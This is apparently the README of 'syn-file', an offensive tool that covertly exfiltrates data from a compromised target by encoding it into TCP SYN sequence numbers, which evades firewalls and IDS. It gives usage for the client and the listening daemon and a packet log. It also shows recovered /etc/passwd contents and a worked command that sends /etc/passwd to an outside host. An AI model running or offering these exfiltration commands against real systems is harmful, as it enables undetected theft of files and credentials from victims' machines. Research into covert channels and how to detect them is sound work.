# syn-file

Exfiltrate data from a compromised target using covert channels abusing TCP SYN header data.


## Intro
**syn-file** is a tool that allows data exfiltration using TCP SYN sequence number packets.
In that way it is possible to bypass firewalls or IDS as no TCP connection is ever opened... similar to TCP SYN scanning.

To be faster exfiltrating data, a useful codification technique is used. Encoding 4 chars in a integer like this:

```seq= buf[0] << 24 | buf[1] << 16 | buf[2] << 8 | buf[3];```

In that manner it is possible to exfiltrate data from a machine running the command **syn-file** to another machine
that is listening on the wire running **syn-daemon**.



## Background

There are some tools to deploy covert channels, mainly using ICMP protocol, padding the content in the payload section...
but that looks quite suspicious and is very easy to spot using a network sniffer, as Wireshark.

However I have not seen any tool to deploy covert channels using TCP sequence numbers, also in **syn-file** the payload is left empty ;-)


## usage / example


### syn-daemon (server)
```
# ./syn-daemon -i iface -s source_ip -f file_for_exfiltrated_data
-i interface
-s source ip
-f file to store exfiltrated data
```

Example:
```
# ./syn-daemon -i eth0 -s 192.168.1.155 -f passwd
using interface: eth0
libcap rule: "src host 192.168.1.155"
#    1 [SYN: 1] [SEQ #: 0x61743a78]
#    2 [SYN: 1] [SEQ #: 0x3a32353a]
#    3 [SYN: 1] [SEQ #: 0x32353a42]
#    4 [SYN: 1] [SEQ #: 0x61746368]
#    5 [SYN: 1] [SEQ #: 0x206a6f62]
#    6 [SYN: 1] [SEQ #: 0x73206461]
#    7 [SYN: 1] [SEQ #: 0x656d6f6e]
#    8 [SYN: 1] [SEQ #: 0x3a2f7661]
#    9 [SYN: 1] [SEQ #: 0x722f7370]
#   10 [SYN: 1] [SEQ #: 0x6f6f6c2f]
...
```

And "passwd" recovered is:
```
# cat passwd 
at:x:25:25:Batch jobs daemon:/var/spool/atjobs:/bin/bash
avahi:x:481:481:User for Avahi:/run/avahi-daemon:/bin/false
avahi-autoipd:x:493:493:User for Avahi IPv4LL:/var/lib/avahi-autoipd:/bin/false
bin:x:1:1:bin:/bin:/bin/bash
colord:x:483:484:user for colord:/var/lib/colord:/sbin/nologin
daemon:x:2:2:Daemon:/sbin:/bin/bash
dnsmasq:x:486:65534:dnsmasq:/var/lib/empty:/bin/false
ftp:x:40:49:FTP account:/srv/ftp:/bin/bash
games:x:12:100:Games account:/var/games:/bin/bash
gdm:x:478:477:Gnome Display Manager daemon:/var/lib/gdm:/bin/false
...
```



### syn-file (client / target machine)
```
# ./syn-file -i interface -d dst_ip -f file_to_exfiltrate -p dst_port -P src_port -m MAC_address_server
-i interface
-d destination ip / IP that runs syn-daemon
-f file to exfiltrate
-p destination port
-P source port
-m MAC address server / syn-daemon
```

Example from target machine:
```
# ./syn-file -i eth0 -d 192.168.1.158 -f /etc/passwd -p 8080 -P 8081 -m 00:0C:0A:4a:3b:5c
